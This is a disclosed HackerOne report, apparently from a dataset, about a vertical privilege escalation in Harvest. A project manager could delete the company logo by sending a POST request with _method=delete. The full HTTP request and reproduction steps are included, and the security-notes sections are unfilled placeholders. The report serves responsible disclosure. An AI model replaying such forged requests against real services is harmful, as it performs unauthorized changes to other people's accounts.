---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159387'
original_report_id: '159387'
title: PM can delete the company logo image (Vertical Privilege Escalation )
weakness: Privilege Escalation
team_handle: harvest
created_at: '2016-08-15T01:42:12.510Z'
disclosed_at: '2016-09-29T23:03:18.157Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- privilege-escalation
---

# PM can delete the company logo image (Vertical Privilege Escalation )

## Metadata

- HackerOne Report ID: 159387
- Weakness: Privilege Escalation
- Program: harvest
- Disclosed At: 2016-09-29T23:03:18.157Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Description : Only Admin can Delete the Company Logo image In company account on harvestapp.But the Deleting Logo HTTP request doesn't validate the Access of the user properly and a Project manager(Limited access to Company Settings ) can  Delete the Logo image of the company.

Vulnerable HTTP reuqest : 

POST /logo?referer=invoice HTTP/1.1
Host: [Company_name].harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/invoices/configure
Cookie: [Cookie_values]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

_method=delete&authenticity_token=[Oauth_Token]

Steps to reproduce : 
1.Create a account with Admin and add project (managerAttacker).
2.Open Project manager's account and Go to link : https://vijaygangani.harvestapp.com/invoices/configure#appearance_edit 
You will see that Project manager doesn't  have access to it.
3.Now send the above mentioned Request to server from Project manager's account and you will see from Admin Account that the Company Logo image has been deleted.

Let me know if you need Video POC for this issue or any other help from my side.

Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
